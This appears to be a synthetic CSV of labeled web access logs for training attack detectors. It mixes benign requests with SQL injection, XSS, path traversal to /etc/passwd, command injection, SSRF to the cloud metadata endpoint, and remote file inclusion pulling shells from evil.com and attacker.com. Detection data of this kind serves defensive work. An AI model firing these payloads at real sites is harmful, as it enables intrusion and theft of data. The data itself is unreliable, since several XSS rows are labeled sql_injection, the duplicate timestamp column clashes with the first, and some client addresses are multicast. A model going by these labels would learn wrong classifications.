logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-06T08:08:31+09:00,192.168.0.186,POST,/api/v1/user/35,404,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T14:06:20+09:00,mobile_browser,https://google.com/search?q=example
2025-05-02T16:16:39+09:00,101.39.27.128,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-13T14:03:25+09:00,browser,-
2025-05-06T20:54:18+09:00,75.70.165.176,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-14T19:53:01+09:00,browser,https://example.com/
2025-05-04T00:09:32+09:00,192.168.0.14,POST,/,302,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-03T10:06:25+09:00,crawler,-
2025-05-07T12:15:49+09:00,192.168.0.62,POST,/search?q=shoes,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-07T06:31:39+09:00,browser,https://www.facebook.com/
2025-05-09T00:10:18+09:00,10.0.0.85,BADTLS,/signup,200,wget/1.5,False,normal,2025-05-01T09:58:50+09:00,script,https://example.com/prev
2025-05-05T21:34:37+09:00,192.168.0.142,POST,/css/style.css?page=5,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-07T17:11:41+09:00,mobile_browser,https://twitter.com/
2025-05-08T12:53:22+09:00,230.170.103.20,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,Metasploit/6.4,True,tls_probe,2025-05-05T11:04:35+09:00,pentest_tool,-
2025-05-10T02:42:52+09:00,72.165.78.210,BADTLS,\x16\x03\x01\x00\a1\x01\x00…,400,-,True,tls_probe,2025-05-11T04:39:20+09:00,pentest_tool,-
2025-05-14T13:41:25+09:00,192.168.0.174,POST,/search?q=shoes,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-01T15:28:48+09:00,mobile_browser,https://twitter.com/
2025-05-03T16:16:09+09:00,192.168.0.80,GET,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-01T22:57:51+09:00,browser,https://twitter.com/
2025-05-09T21:04:46+09:00,10.0.0.235,GET,/login.php?username=admin' OR '1'='1'--&password=pw,200,python-requests/2.10,True,sql_injection,2025-05-04T20:58:49+09:00,script,-
2025-05-13T16:09:52+09:00,10.0.0.31,GET,/product?id=10;DROP TABLE users,200,Nikto/2.1.6 (Evasions:none),True,sql_injection,2025-05-03T14:42:20+09:00,pentest_tool,-
2025-05-12T21:15:34+09:00,192.168.0.44,POST,/js/app.js?page=2,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-05T13:38:39+09:00,browser,https://www.facebook.com/
2025-05-11T08:18:32+09:00,10.0.0.131,GET,/search?q=<script>alert('x')</script>,500,Twitterbot/1.0,True,xss,2025-05-03T20:56:43+09:00,crawler,https://twitter.com/
2025-05-11T20:37:03+09:00,192.168.0.162,POST,/,500,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T06:07:58+09:00,mobile_browser,https://twitter.com/
2025-05-07T21:13:58+09:00,85.12.48.208,BADTLS,\x16\x03\x01\x00\e6\x01\x00…,400,-,True,tls_probe,2025-05-09T20:18:34+09:00,pentest_tool,-
2025-05-05T13:09:30+09:00,10.0.0.135,POST,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,200,BurpSuite Community/2025.4,True,xss,2025-05-06T22:59:00+09:00,pentest_tool,-
2025-05-11T00:21:24+09:00,192.168.0.25,GET,/signup,302,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T12:31:15+09:00,mobile_browser,-
2025-05-06T20:14:02+09:00,10.106.143.33,POST,/login?username=user958&password=pass1398,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-06T20:14:02+09:00,browser,https://example.com/
2025-05-06T12:11:53+09:00,192.168.0.18,POST,/login,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0,False,normal,2025-05-07T11:47:28+09:00,browser,https://twitter.com/
2025-05-13T07:50:56+09:00,239.244.196.203,GET,/comment?msg=<svg onload=alert(1)>,200,Mozilla/5.0 (X11; Linux x86_64),True,xss,2025-05-06T05:28:35+09:00,browser,-
2025-05-06T07:46:49+09:00,10.0.0.32,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,500,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),True,ssrf_rfi,2025-05-07T16:23:23+09:00,crawler,-
2025-05-03T21:47:49+09:00,10.0.0.110,POST,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,403,Metasploit/6.4,True,command_injection,2025-05-06T08:54:32+09:00,pentest_tool,-
2025-05-10T15:33:43+09:00,10.0.0.70,POST,/images/....//....//etc/passwd,403,Nikto/2.1.6 (Evasions:none),True,directory_traversal,2025-05-03T12:30:33+09:00,pentest_tool,-
2025-05-07T13:52:55+09:00,136.53.143.73,BADTLS,\x16\x03\x01\x00\de\x01\x00…,400,-,True,tls_probe,2025-05-14T04:21:35+09:00,pentest_tool,-
2025-05-14T00:19:38+09:00,10.209.26.225,GET,/search?q=모자&page=3,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-14T00:19:38+09:00,browser,https://example.com/
2025-05-12T00:28:05+09:00,55.160.39.59,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,200,Nikto/2.1.6 (Evasions:none),True,tls_probe,2025-05-07T09:56:53+09:00,pentest_tool,-
2025-05-04T20:36:02+09:00,172.16.0.251,POST,/search?q=shoes,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",False,normal,2025-05-02T21:32:31+09:00,browser,https://example.com/prev
2025-05-05T12:34:05+09:00,10.0.0.175,GET,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,404,OWASP ZAP,True,ssrf_rfi,2025-05-01T14:50:20+09:00,pentest_tool,https://google.com/search?q=example
2025-05-01T09:47:18+09:00,192.168.0.76,POST,/,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-03T07:26:51+09:00,browser,https://example.com/prev
2025-05-08T13:31:10+09:00,10.0.0.164,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,403,python-requests/2.70,True,command_injection,2025-05-04T07:56:40+09:00,script,-
2025-05-09T09:46:31+09:00,192.168.0.73,GET,/about,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T21:06:28+09:00,crawler,-
2025-05-09T20:42:07+09:00,10.0.0.154,GET,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,True,ssrf_rfi,2025-05-01T12:34:04+09:00,browser,https://google.com/search?q=example
2025-05-10T09:53:31+09:00,10.0.0.213,POST,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,200,sqlmap/1.7#stable,True,command_injection,2025-05-06T21:22:20+09:00,pentest_tool,https://www.facebook.com/
2025-05-13T13:09:20+09:00,10.0.0.217,GET,/images/....//....//etc/passwd,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,True,directory_traversal,2025-05-04T17:16:46+09:00,browser,-
2025-05-03T12:30:53+09:00,10.0.0.95,POST,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,BurpSuite Community/2025.4,True,xss,2025-05-07T22:40:19+09:00,pentest_tool,-
2025-05-11T07:10:22+09:00,24.37.52.234,GET,/load?file=http://attacker.com/evil.php,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-02T08:44:18+09:00,script,-
2025-05-13T17:59:53+09:00,192.168.0.122,GET,/products?page=3,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-05T18:01:19+09:00,browser,https://twitter.com/
2025-05-14T16:31:59+09:00,10.0.0.249,GET,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,BurpSuite Community/2025.4,True,xss,2025-05-07T22:43:06+09:00,pentest_tool,-
2025-05-09T08:42:51+09:00,10.0.0.147,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,Metasploit/6.4,True,sql_injection,2025-05-04T16:03:53+09:00,pentest_tool,-
2025-05-07T01:16:51+09:00,10.0.0.12,POST,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",True,xss,2025-05-02T19:54:57+09:00,browser,https://google.com/search?q=example
2025-05-13T01:19:54+09:00,10.0.0.115,GET,/product?id=10;DROP TABLE users,403,wpscan/3.8.23,True,sql_injection,2025-05-07T23:34:35+09:00,pentest_tool,-
2025-05-09T06:58:00+09:00,108.65.115.67,GET,/home,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-10T18:49:00+09:00,browser,https://example.com/
2025-05-02T04:01:10+09:00,145.126.247.39,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-04T22:39:32+09:00,browser,https://example.com/
2025-05-10T09:20:57+09:00,192.168.0.156,GET,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Edge/109.0,False,normal,2025-05-01T17:16:46+09:00,browser,-
2025-05-06T20:16:23+09:00,192.168.0.251,POST,/,302,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-07T09:59:46+09:00,mobile_browser,https://google.com/search?q=example
2025-05-11T02:55:47+09:00,236.24.236.140,POST,/api/login?username=user&password=secret,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-13T20:08:52+09:00,browser,https://example.com/
2025-05-06T07:09:23+09:00,192.168.0.230,GET,/css/style.css,200,wget/1.0,False,normal,2025-05-03T18:57:43+09:00,script,-
2025-05-01T18:41:05+09:00,221.33.240.181,GET,/include?template=http://evil.com/shell.txt,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-09T07:44:24+09:00,script,-
2025-05-02T20:41:12+09:00,192.168.0.244,GET,/home?page=5,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T10:25:59+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-01T15:58:09+09:00,10.0.0.250,GET,/search?q=<script>alert('x')</script>,200,OWASP ZAP,True,sql_injection,2025-05-05T22:50:31+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-05T16:31:22+09:00,10.137.58.230,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-05T16:31:22+09:00,unknown,-
2025-05-08T15:43:36+09:00,192.168.0.166,GET,/api/v1/user/35?page=1,304,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),False,normal,2025-05-02T14:29:37+09:00,crawler,-
2025-05-04T07:42:33+09:00,10.0.0.236,GET,/search?q=<script>alert('x')</script>,403,wget/1.4,True,sql_injection,2025-05-05T14:30:13+09:00,script,-
2025-05-01T00:13:30+09:00,10.0.0.92,GET,/images/....//....//etc/passwd,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,directory_traversal,2025-05-04T14:18:39+09:00,crawler,-
2025-05-08T00:20:15+09:00,10.0.0.118,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,wpscan/3.8.23,True,xss,2025-05-06T17:28:30+09:00,pentest_tool,-
2025-05-08T16:30:55+09:00,192.168.0.131,POST,/,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-03T10:22:23+09:00,mobile_browser,https://www.facebook.com/
2025-05-10T13:37:44+09:00,192.168.0.153,GET,/signup?page=4,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,False,normal,2025-05-07T10:37:12+09:00,browser,https://example.com/prev
2025-05-10T07:09:21+09:00,10.0.0.90,GET,/login.php?username=admin' OR '1'='1'--&password=pw,200,python-requests/2.00,True,sql_injection,2025-05-04T06:07:00+09:00,script,-
2025-05-14T16:13:09+09:00,136.195.189.60,GET,/profile?bio=<img src=x onerror=alert(1337)>,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,xss,2025-05-08T11:55:33+09:00,browser,-
2025-05-08T14:33:06+09:00,145.145.40.107,GET,/,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-09T11:21:37+09:00,browser,https://example.com/
2025-05-09T21:33:11+09:00,10.0.0.174,GET,/images/....//....//etc/passwd,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Edge/102.0,True,directory_traversal,2025-05-07T11:57:45+09:00,browser,-
2025-05-07T08:52:42+09:00,10.0.0.169,POST,/admin/backup?file=config;echo+x,500,curl/7.1,True,command_injection,2025-05-05T13:00:44+09:00,script,-
2025-05-13T22:52:29+09:00,192.168.1.93,GET,/api/v1/user/35,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T08:45:47+09:00,mobile_browser,https://www.facebook.com/
2025-05-04T18:33:19+09:00,113.210.195.89,BADTLS,\x16\x03\x01\x00\8a\x01\x00…,400,-,True,tls_probe,2025-05-13T23:57:28+09:00,pentest_tool,-
2025-05-04T22:40:40+09:00,10.0.0.52,GET,/product?id=10;DROP TABLE users,200,Nessus v10.5,True,sql_injection,2025-05-03T08:08:54+09:00,pentest_tool,-
2025-05-12T13:42:35+09:00,10.0.0.213,GET,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,200,Nessus v10.5,True,command_injection,2025-05-02T23:08:49+09:00,pentest_tool,https://google.com/search?q=example
2025-05-08T13:22:44+09:00,192.168.0.180,POST,/js/app.js?page=4,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-02T13:19:22+09:00,mobile_browser,-
2025-05-09T15:29:31+09:00,235.43.195.85,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,True,tls_probe,2025-05-02T17:58:17+09:00,browser,-
2025-05-05T12:55:56+09:00,10.0.0.222,GET,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,500,Metasploit/6.4,True,ssrf_rfi,2025-05-06T16:23:57+09:00,pentest_tool,-
2025-05-08T01:48:19+09:00,192.168.0.154,POST,/,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-02T13:47:49+09:00,crawler,-
2025-05-03T10:08:14+09:00,200.99.214.188,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-08T12:01:38+09:00,browser,https://example.com/
2025-05-03T07:50:53+09:00,10.0.0.235,GET,/comment?msg=<script>alert('x')</script>,200,python-requests/2.55,True,xss,2025-05-02T21:34:59+09:00,script,-
2025-05-10T21:20:49+09:00,81.244.124.221,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-07T18:30:27+09:00,browser,https://example.com/
2025-05-03T16:11:13+09:00,36.97.17.73,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,500,BurpSuite Community/2025.4,True,tls_probe,2025-05-01T18:19:14+09:00,pentest_tool,-
2025-05-12T11:46:06+09:00,59.229.217.184,GET,/static/js/app.js,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-06T18:39:52+09:00,browser,https://example.com/
2025-05-01T07:56:10+09:00,10.233.191.86,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-01T07:56:10+09:00,unknown,-
2025-05-08T07:57:04+09:00,192.168.0.193,GET,/css/style.css?page=1,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T22:20:03+09:00,mobile_browser,https://google.com/search?q=example
2025-05-07T09:59:51+09:00,155.29.46.249,GET,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-11T05:57:25+09:00,browser,-
2025-05-12T21:24:22+09:00,192.168.0.117,POST,/products/4.html,304,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T20:04:30+09:00,mobile_browser,https://www.facebook.com/
2025-05-03T12:58:00+09:00,10.193.187.165,POST,/login?username=user833&password=pass6800,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",False,normal,2025-05-03T12:58:00+09:00,browser,https://example.com/
2025-05-13T01:07:16+09:00,10.0.0.221,POST,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,403,BurpSuite Community/2025.4,True,ssrf_rfi,2025-05-06T11:07:37+09:00,pentest_tool,https://google.com/search?q=example
2025-05-01T08:17:59+09:00,10.0.0.58,GET,/ping%253Fhost%253D8.8.8.8%253Bcat%252B/etc/passwd,500,curl/7.6,True,command_injection,2025-05-05T08:11:53+09:00,script,-
2025-05-10T09:03:22+09:00,10.0.0.254,POST,/images/....//....//etc/passwd,403,BurpSuite Community/2025.4,True,directory_traversal,2025-05-05T07:26:01+09:00,pentest_tool,-
2025-05-09T12:16:19+09:00,208.136.102.49,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",True,tls_probe,2025-05-01T09:13:32+09:00,browser,-
2025-05-01T21:29:42+09:00,10.0.0.236,GET,/images/....//....//etc/passwd,404,curl/7.3,True,directory_traversal,2025-05-05T16:35:02+09:00,script,-
2025-05-06T12:24:11+09:00,10.0.0.4,POST,/admin/backup?file=config;echo+x,200,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-07T17:50:52+09:00,pentest_tool,-
2025-05-08T12:38:14+09:00,10.0.0.155,POST,/ping?host=8.8.8.8;cat+/etc/passwd,404,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-06T16:49:44+09:00,pentest_tool,-
2025-05-04T20:15:43+09:00,44.181.162.131,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-07T11:15:36+09:00,browser,https://example.com/
2025-05-07T16:40:41+09:00,10.0.0.105,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,python-requests/2.45,True,xss,2025-05-07T21:00:09+09:00,script,https://bing.com/search?q=foo
2025-05-01T00:42:07+09:00,10.0.0.209,GET,/product%3Fid%3D10%3BDROP%20TABLE%20users,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Edge/109.0,True,sql_injection,2025-05-01T07:05:58+09:00,browser,-
2025-05-08T20:19:37+09:00,172.16.0.171,GET,/products/4.html,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T23:53:49+09:00,mobile_browser,https://www.facebook.com/
2025-05-04T18:53:32+09:00,110.231.149.83,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-12T19:46:03+09:00,browser,-
2025-05-14T01:11:48+09:00,192.168.0.105,GET,/js/app.js,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-02T12:08:43+09:00,browser,https://example.com/prev
2025-05-13T15:13:18+09:00,192.168.0.133,POST,/signup,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-04T18:49:47+09:00,mobile_browser,https://example.com/prev
2025-05-07T20:22:48+09:00,192.168.0.44,GET,/search?q=shoes,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-07T11:54:46+09:00,mobile_browser,https://twitter.com/
2025-05-10T08:54:29+09:00,192.168.0.17,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-01T11:07:05+09:00,browser,https://bing.com/search?q=foo
2025-05-14T17:08:01+09:00,10.0.0.149,POST,/images/....//....//etc/passwd,200,wpscan/3.8.23,True,directory_traversal,2025-05-02T21:21:25+09:00,pentest_tool,-
2025-05-03T12:53:16+09:00,172.16.0.78,POST,/home,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-04T13:58:57+09:00,crawler,-
2025-05-10T01:26:48+09:00,67.95.197.203,POST,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-10T07:38:38+09:00,browser,-
2025-05-07T12:24:57+09:00,10.0.0.209,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,500,OWASP ZAP,True,xss,2025-05-05T13:56:13+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-03T12:58:46+09:00,10.0.0.235,POST,/load?file=http://evil.com/shell.txt,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-04T08:37:33+09:00,browser,https://bing.com/search?q=foo
2025-05-09T15:30:53+09:00,10.0.0.77,POST,/proxy%253Furl%253Dhttp%253A//169.254.169.254/latest/meta-data/,404,wget/1.0,True,ssrf_rfi,2025-05-01T07:32:11+09:00,script,-
2025-05-02T20:30:08+09:00,10.0.0.184,GET,/images/....//....//etc/passwd,403,wpscan/3.8.23,True,directory_traversal,2025-05-07T07:14:21+09:00,pentest_tool,-
2025-05-08T21:13:34+09:00,149.201.231.105,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-10T17:51:54+09:00,browser,-
2025-05-09T00:30:50+09:00,252.246.123.79,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,200,Nikto/2.1.6 (Evasions:none),True,tls_probe,2025-05-06T07:09:46+09:00,pentest_tool,-
2025-05-13T15:17:16+09:00,192.168.0.29,GET,/js/app.js,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-07T19:30:04+09:00,browser,https://twitter.com/
2025-05-13T23:58:36+09:00,176.151.69.139,POST,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-03T19:18:29+09:00,browser,-
2025-05-03T12:21:30+09:00,192.168.0.233,GET,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-07T12:06:41+09:00,mobile_browser,-
2025-05-09T15:51:47+09:00,10.212.38.107,POST,/login?username=user182&password=pass7532,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",False,normal,2025-05-09T15:51:47+09:00,browser,-
2025-05-03T13:27:29+09:00,10.0.0.109,GET,/images/....//....//etc/passwd,403,python-requests/2.25,True,directory_traversal,2025-05-04T15:49:58+09:00,script,-
2025-05-06T22:38:58+09:00,10.0.0.168,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,403,curl/7.7,True,ssrf_rfi,2025-05-05T15:39:32+09:00,script,https://google.com/search?q=example
2025-05-10T22:40:41+09:00,10.14.6.131,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-10T22:40:41+09:00,unknown,-
2025-05-11T13:27:47+09:00,192.168.0.244,POST,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-01T14:07:58+09:00,mobile_browser,-
2025-05-13T18:51:47+09:00,112.96.125.218,POST,/status?cmd=`id`,500,sqlmap/1.7.4#stable,True,command_injection,2025-05-09T16:07:29+09:00,script,-
2025-05-04T13:31:01+09:00,192.168.0.83,GET,/?page=3,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T20:57:55+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-08T13:03:02+09:00,10.0.0.28,POST,/images/....//....//etc/passwd,500,Nessus v10.5,True,directory_traversal,2025-05-01T23:29:50+09:00,pentest_tool,-
2025-05-06T00:39:22+09:00,239.60.240.160,GET,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-04T17:08:48+09:00,browser,-
